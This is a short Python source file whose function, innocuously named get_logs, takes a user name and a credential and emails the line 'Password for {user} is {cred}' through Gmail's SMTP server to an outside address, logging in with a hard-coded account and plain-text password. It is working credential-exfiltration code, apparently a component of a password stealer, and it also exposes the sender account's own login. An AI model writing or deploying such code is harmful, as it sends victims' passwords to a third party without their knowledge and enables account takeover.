from smtplib import SMTP
import smtplib

def get_logs(user,cred):
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login("vatsalgamit4@gmail.com", "moreoutoflife")
    message = f"Password for {user} is {cred}"
    s.sendmail("vatsalgamit4@gmail.com", "v.s.gamit999@gmail.com", message)
    s.quit()
